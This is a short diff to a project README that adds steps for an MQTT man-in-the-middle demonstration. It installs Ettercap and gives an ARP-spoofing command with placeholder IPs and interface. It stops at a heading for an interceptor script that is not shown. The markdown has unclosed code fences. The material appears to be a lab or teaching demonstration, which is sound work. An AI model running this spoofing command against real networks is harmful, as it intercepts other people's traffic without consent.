@@ -21,3 +21,10 @@ This project demonstrates a Man-in-the-Middle (MITM) attack on MQTT (Message Que
 1. **Install Paho-MQTT**: 
    ```bash
    pip install paho-mqtt
+2. **install Ettercap
+   ```bash
+   sudo apt-get install ettercap-text-only
+### Step 2: Perform ARP Spoofing with Ettercap
+   ```bash
+   sudo ettercap -T -q -i <your interface> -M arp:remote /<ip1>// /<ip2>//
+### Step 3: Run the MQTT Interceptor Script
